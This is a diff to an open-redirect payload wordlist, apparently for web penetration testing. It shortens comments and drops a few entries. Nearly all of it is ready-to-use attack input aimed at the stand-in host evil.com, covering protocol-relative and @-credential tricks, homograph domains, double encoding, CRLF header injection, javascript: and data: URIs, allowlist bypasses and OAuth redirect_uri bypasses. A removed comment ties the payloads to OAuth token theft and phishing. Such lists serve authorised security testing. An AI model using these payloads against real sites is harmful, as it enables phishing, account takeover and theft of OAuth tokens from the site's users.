@@ -1,8 +1,5 @@
 # ============================================================
 # Open Redirect Payloads
-# Use: Burp Intruder, dalfox, manual testing
-# Inject into: redirect=, next=, return=, url=, to=, goto=
-# Chain with: OAuth token theft, phishing, SSRF bypass
 # ============================================================
 
 # ---- Basic ----
@@ -16,7 +13,6 @@ http://evil.com
 \\/evil.com
 
 # ---- Protocol-Relative ----
-//evil.com
 //evil.com/path
 //evil.com/path?q=1
 //evil.com%2f
@@ -24,7 +20,7 @@ http://evil.com
 //evil.com#
 //evil.com%23
 
-# ---- @-Based (URL credential confusion) ----
+# ---- @-Based ----
 https://target.com@evil.com
 https://target.com:443@evil.com
 http://target.com@evil.com/path
@@ -56,12 +52,12 @@ https://evil.com\@target.com
 %09//evil.com
 %00//evil.com
 
-# ---- Unicode/IDS Bypass ----
-//eeevil.com (homograph)
-//еvil.com (Cyrillic е)
+# ---- Unicode / Homograph ----
+//eeevil.com
+//еvil.com
 //𝓮vil.com
-//evil。com (fullwidth period)
-//evil．com (fullwidth dot)
+//evil。com
+//evil．com
 //evil%E3%80%82com
 
 # ---- Path-Based ----
@@ -79,47 +75,39 @@ javascript:window.open('https://evil.com')
 data:text/html,<script>window.location='https://evil.com'</script>
 vbscript:window.location='https://evil.com'
 
-# ---- Double URL Encoding ----
+# ---- Double Encoding ----
 %252F%252Fevil.com
 %25252F%25252Fevil.com
 //evil.%63om
 //evil.c%6fm
 
-# ---- Newline Injection (header injection chain) ----
+# ---- Newline Injection ----
 https://evil.com%0d%0aLocation:%20https://evil.com
 https://evil.com%0aLocation:%20https://evil.com
 https://evil.com\r\nLocation:\x20https://evil.com
 
-# ---- Whitelisted Domain Bypass ----
-# If filter checks if URL contains target.com:
+# ---- Whitelist Bypass ----
 https://evil.com?ref=target.com
-https://evil.com#target.com
-https://evil.com/target.com
-https://target.com.evil.com
 https://targetXcom.evil.com
 
-# ---- Specific Framework Bypass ----
-# Spring: redirect:https://evil.com
-# Rails: /redirects?uri=//evil.com
-# Django next param
+# ---- Framework Specific ----
 /?next=//evil.com
 /?next=https://evil.com
 /?next=%2F%2Fevil.com
 
-# ---- OAuth Redirect URI Bypass ----
-# If redirect_uri must match pattern:
+# ---- OAuth Bypass ----
 https://target.com/callback/../../../evil.com
 https://target.com.evil.com/callback
 https://target.com%60.evil.com/callback
 https://evil.com%23.target.com/callback
 https://evil.com?redirect_uri=https://target.com/callback
 
-# ---- CRLF + Open Redirect Chain ----
+# ---- CRLF Chain ----
 /%0d%0aLocation:%20https://evil.com
 /%0aLocation:%20https://evil.com
 /redirect?url=%0d%0aLocation:%20https://evil.com
 
-# ---- Common Parameter Names (inject above payloads) ----
+# ---- Parameters ----
 redirect
 redirect_uri
 redirect_url
